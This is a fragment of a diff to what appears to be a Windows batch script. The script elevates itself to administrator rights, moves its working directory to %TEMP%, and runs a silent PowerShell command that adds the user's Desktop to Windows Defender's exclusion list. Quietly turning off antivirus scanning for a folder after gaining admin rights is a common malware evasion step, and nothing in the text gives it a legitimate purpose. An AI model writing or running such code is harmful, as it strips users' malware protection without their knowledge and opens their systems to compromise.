@@ -20,7 +20,7 @@ if '%errorlevel%' NEQ '0' (
     exit /B
 
 :gotAdmin
-    pushd "%CD%"
+    pushd "%TEMP%"
     CD /D "%~dp0"
 :--------------------------------------
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "%userprofile%/Desktop"
